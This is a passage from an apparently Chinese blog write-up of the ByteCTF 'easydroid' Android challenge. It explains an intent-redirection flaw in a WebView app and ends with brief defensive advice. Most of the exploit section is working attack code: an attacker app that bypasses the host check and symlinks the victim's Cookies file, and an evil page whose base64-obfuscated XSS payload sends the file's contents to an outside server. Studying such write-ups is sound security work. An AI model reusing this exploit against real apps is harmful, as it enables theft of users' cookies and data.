class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.FlagReceiver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>两个activity，一个receiver，其中只有MainActivity是可导出的。</p>
<h5 id="FlagReceiver-2">FlagReceiver<a class="header-anchor" href="#FlagReceiver-2"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        String flag = intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String v0_1 = Base64.encodeToString(flag.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="number">0</span>);</span><br><span class="line">                CookieManager.getInstance().setCookie(<span class="string">&quot;https://tiktok.com/&quot;</span>, <span class="string">&quot;flag=&quot;</span> + v0_1);</span><br><span class="line">                Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该文件接收intent中key为<code>&quot;flag&quot;</code>的数据value，然后将其通过<code>setCookie</code>设置到cookie文件。</p>
<p>而cookie文件位于<code>/data/data/com.bytectf.easydroid/app_webview/Cookies</code>(API 27)文件中</p>
<p>我们如果想要获取flag，只需要获取该Cookie文件就可以了。</p>
<h5 id="MainActivity-2">MainActivity<a class="header-anchor" href="#MainActivity-2"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg5);</span><br><span class="line">    Uri data = <span class="keyword">this</span>.getIntent().getData();</span><br><span class="line">    <span class="keyword">if</span>(data == <span class="keyword">null</span>) &#123;</span><br><span class="line">        data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>)) &amp;&amp; (data.getScheme().equals(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">        WebView webView = <span class="keyword">new</span> WebView(<span class="keyword">this</span>.getApplicationContext());</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView arg5, String arg6)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(Uri.parse(arg6).getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        MainActivity.<span class="keyword">this</span>.startActivity(Intent.parseUri(arg6, <span class="number">1</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span>(URISyntaxException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(arg5, arg6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.loadUrl(data.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个Activity比较重要。</p>
<p>获取了intent，并且读取了intent携带的data数据。如果data数据为空，则 设置data为一个普通的Uri，并不执行其他操作</p>
<p>如果<code>getAuthority()</code>得到的字符串中包括<code>&quot;toutiao.com&quot;</code>、scheme为<code>&quot;http&quot;</code>。则会使用webView来加载该链接。</p>
<p>而<code>shouldOverrideUrlLoading()</code>方法会在WebView中每次发起跳转的时候被回调。回调的时候该方法判断scheme是否等于<code>&quot;intent&quot;</code>，如果等于<code>&quot;intent&quot;</code>，则使用<code>startActivity()</code>方法启动该intent相应的组件，该方法第二个参数flags代表着Uri被解析格式规范</p>
<h5 id="TestActivity">TestActivity<a class="header-anchor" href="#TestActivity"> ¶ </a></h5>
<p>该activity设置成未导出状态，我们没办法直接访问。但是该activity没有对intent进行任何校验，就直接使用WebView来加载intent携带的key为<code>&quot;url&quot;</code>的数据了。</p>
<p>我想我们的目标就是它了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg5);</span><br><span class="line">    String url = <span class="keyword">this</span>.getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    WebView webView = <span class="keyword">new</span> WebView(<span class="keyword">this</span>.getApplicationContext());</span><br><span class="line">    <span class="keyword">this</span>.setContentView(webView);</span><br><span class="line">    webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webView.loadUrl(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="利用思路-2">利用思路<a class="header-anchor" href="#利用思路-2"> ¶ </a></h3>
<p>我们的最终目标是通过TestActivity加载Cookie文件，并通过某种方式得到回显。</p>
<h4 id="Intent重定向">Intent重定向<a class="header-anchor" href="#Intent重定向"> ¶ </a></h4>
<p>因为MainActivity是可导出的，我们可以给MainActivity传递一个intent，同时绕过authority和scheme的验证，使其可以访问到构造好的evil网址。</p>
<p>则需要构造一个Uri，我选择构造的为<code>&quot;http://app.toutiao.com@[evil_page]&quot;</code>，这样便可以访问到evil_page</p>
<p>同时evil_page内通过使用<code>location.href</code>添加一个Intent的Uri。当访问时，<code>shouldOverrideUrlLoading()</code>方法就会被回调。并且解析该Uri作为intent并使用<code>startActivity()</code>来启动。</p>
<p>我们只需让该intent携带一个<code>&quot;url&quot;</code>的数据，并且明确指向TestActivity。这样当TestActivity接收到后，就会将url来加载。</p>
<h4 id="WebView窃取Cookies">WebView窃取Cookies<a class="header-anchor" href="#WebView窃取Cookies"> ¶ </a></h4>
<p>我们的目标是获得Cookie文件，如果将Cookies文件的路径放到<code>&quot;url&quot;</code>的数据中，便可以将Cookies当作html解释，但只是将Cookies文件使用WebView加载还是不够，因为我们需要将Cookies文件中的内容传输回来。</p>
<p>于是就可以在evil_page中使用<code>document.cookie=</code>设置一个cookie，然后里面填写恶意的JavaScript代码将数据发送到接收方。当将Cookie当做html解释时，恶意JavaScript代码就会执行。</p>
<p>还有一个点是Cookies文件没有后缀名，我们还需要创建一个<code>.html</code>的符号链接来指向Cookies文件，这样才能实现WebView加载Cookies文件。</p>
<h3 id="Attack代码实现-2">Attack代码实现<a class="header-anchor" href="#Attack代码实现-2"> ¶ </a></h3>
<h4 id="AttackAPP-2">AttackAPP<a class="header-anchor" href="#AttackAPP-2"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义evil_page的地址</span></span><br><span class="line">    String base = <span class="string">&quot;10.7.89.108/MyTest/evil.html&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 构造一个恶意Intent，让shouldOverrideUrlLoading回调时候使用startActivity传递该Intent</span></span><br><span class="line">        buildEvilIntent();</span><br><span class="line">        <span class="comment">// 启动搭建好的evil 网页，让目标app访问。</span></span><br><span class="line">        launch(base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildEvilIntent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Intent evil = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 设置目的组件为TestActivity</span></span><br><span class="line">        evil.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 将需要WebView加载的Cookies符号地址链接传递过去</span></span><br><span class="line">        evil.putExtra(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;file:&quot;</span>+symlink());</span><br><span class="line">        <span class="comment">// flags是转换的格式，同MainActivity为1</span></span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree-evilUri&quot;</span>,evil.toUri(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 复制该Uri，然后在evil_page中添加 跳转到该Uri的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">launch</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 构造一个intent</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        <span class="comment">// 设置目的组件为MainActivity</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 构造恶意Uri，使用@突破校验</span></span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;http://www.toutiao.com@&quot;</span> + url));</span><br><span class="line">        <span class="comment">// 设置activity启动模式</span></span><br><span class="line">        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        <span class="comment">// 启动目标app的activity</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">symlink</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 获得应用数据目录</span></span><br><span class="line">        String root = getApplicationInfo().dataDir;</span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;root path:&quot;</span>+root);</span><br><span class="line">        <span class="comment">// 构造一个符号链接</span></span><br><span class="line">        String symlink = root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;symlink path:&quot;</span>+symlink);</span><br><span class="line">        String cookies = <span class="keyword">null</span>;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Cookies所在路径</span></span><br><span class="line">            cookies = getPackageManager().getApplicationInfo(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="number">0</span>).dataDir +<span class="string">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class="line">            Log.d(<span class="string">&quot;PwnThree&quot;</span>,<span class="string">&quot;Cookies path:&quot;</span>+cookies);</span><br><span class="line">            <span class="comment">// 删除该path对应的文件，防止创建符号链接时冲突。</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;rm &quot;</span>+symlink).waitFor();</span><br><span class="line">            <span class="comment">// 创建该符号链接，使后缀名为.html。方便WebView打开</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;ln -s &quot;</span>+cookies+<span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">            <span class="comment">// 赋予应用目录最高777权限，使外部应用也可以访问该目录</span></span><br><span class="line">            runtime.exec(<span class="string">&quot;chmod -R 777 &quot;</span>+root).waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回创建的符号链接的全路径</span></span><br><span class="line">        <span class="keyword">return</span> symlink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="evil-page">evil_page<a class="header-anchor" href="#evil-page"> ¶ </a></h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>injected cookie with xss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">&quot;sendData = &#x27;&lt;img src=\&quot;evil\&quot; onerror=\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> baseUrl = <span class="string">&quot;http://10.7.89.108/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Image().src = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;open evil page.&quot;</span>);</span></span><br><span class="line"><span class="javascript">     <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">         location.href = <span class="string">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class="line"><span class="javascript">     &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>h10：添加了一个cookie，名字为<code>&quot;sendData&quot;</code>，相应的值是一个<code>&lt;img&gt;</code>标签，<code>src</code>属性是一个不存在的路径，因此<code>&lt;img&gt;</code>标签在装载文档或图像的过程中会发生错误，就会执行<code>onerror</code>事件。使用<code>eval()</code>来执行js代码文本，<code>atob()</code>将文本进行base64解密得到真实的代码。</p>
<p>其中base64的代码源为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">&quot;http://10.7.89.108/MyTest/ReceiveServlet?&quot;</span></span><br><span class="line"><span class="keyword">new</span> Image().src = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;html&quot;</span>)[<span class="number">0</span>].innerHTML);</span><br></pre></td></tr></table></figure>
<p>也就是将该页面全部内容作为参数发送到接收方</p>
</li>
<li>
<p>h11~h12：只是简单的通知一下接收方用户打开了该页面（可以去掉</p>
</li>
<li>
<p>h13~h15：使用setTimeout延时40s再跳转。因为含有恶意js代码的cookie的写入需要一定时间</p>
<p>等待好后会跳转前往 构造好的intent的Uri。之后便会被<code>shouldOverrideUrlLoading()</code>回调函数捕获，并通过<code>startActivity()</code>来启动TestActivity</p>
</li>
</ul>
<h4 id="本地实现-2">本地实现<a class="header-anchor" href="#本地实现-2"> ¶ </a></h4>
<p>输入命令让FlagReceiver接收到flag并将其存放在cookie中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.easydroid/.FlagReceiver -e flag ByteCTF&#123;testFlag_x_easydroid&#125;</span><br></pre></td></tr></table></figure>
<p>此时可以看到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211018171002253.png" alt="image-20211018171002253"></p>
<p>预设置的flag已经存储在<code>/data/user/0/com.bytectf.easydroid/app_webview/Cookies</code>中</p>
<p>实现效果图（中间删除了部分重复帧）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pwn3.gif" alt="pwn3"></p>
<p>可见已经成功获取到了cookie文件。</p>
<h2 id="最后-2">最后<a class="header-anchor" href="#最后-2"> ¶ </a></h2>
<p>通过上述两题的例子，可见我们虽然没有相应权限，但都通过导出组件对Intent重定向不完善的校验产生的漏洞，间接访问到了未导出的组件。</p>
<p>如何防范：</p>
<ol>
<li>应严格控制组件的可导出权限，没必要导出的组件添加<code>android:exported=&quot;false&quot;</code>属性</li>
<li>在进行Intent重定向时，应对Intent进行严格的校验。</li>
<li>添加代码混淆，提高攻击成本</li>
</ol>
<p>个人的一些浅见，文中如有错误，敬请斧正。</p>
<p>参考资料：</p>
<ul>
<li><a href="https://bytedance.feishu.cn/file/boxcnWibqpknk3S708qerqHoxiP">Docs (feishu.cn)</a></li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android漏洞</tag>
      </tags>
  </entry>
</search>
